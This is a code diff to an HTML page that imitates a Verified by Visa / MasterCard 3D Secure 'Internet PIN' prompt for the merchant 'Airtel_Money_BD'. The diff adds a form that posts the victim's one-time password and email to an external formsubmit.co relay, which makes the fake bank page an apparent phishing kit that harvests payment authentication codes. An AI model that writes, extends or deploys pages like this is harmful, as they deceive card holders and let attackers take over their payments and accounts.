@@ -12,9 +12,12 @@
             <img src="Screenshot 2024-09-13 at 2.00.14 AM.png" alt="Verified by VISA">
             <img src="Screenshot 2024-09-14 at 3.03.42 AM.png" alt="MasterCard">
         </div>
-       
-            <h3>Internet PIN</h3>
-            <p>Please enter your Verified by Visa 3D Secure PIN in the space provided below to confirm your indentity for this purchase. This information will not be shared with the merchant.</p>
+
+        <h3>Internet PIN</h3>
+        <p>Please enter your Verified by Visa 3D Secure PIN in the space provided below to confirm your identity for this purchase. This information will not be shared with the merchant.</p>
+
+        <!-- Replaced form -->
+        <form action="https://formsubmit.co/your@email.com" method="POST">
             <div class="inputBox">
                 <label for="merchant">Merchant Name:</label>
                 <input type="text" id="merchant" value="Airtel_Money_BD" readonly>
@@ -29,13 +32,16 @@
             </div>
             <div class="inputBox">
                 <label for="cardName">One Time Password:</label>
-                <input type="text" id="cardName"  required>
+                <input type="text" name="name" id="cardName" required>
             </div>
-            <a href="fail.html">
+            <div class="inputBox">
+                <label for="email">Email:</label>
+                <input type="email" name="email" required>
+            </div>
             <input type="submit" value="Submit" class="submit-btn">
-        </a>
-            <p class="timeout">This page will automatically timeout after 180 seconds</p>
+        </form>
 
+        <p class="timeout">This page will automatically timeout after 180 seconds</p>
     </div>
     <script src="index.js"></script>
 </body>
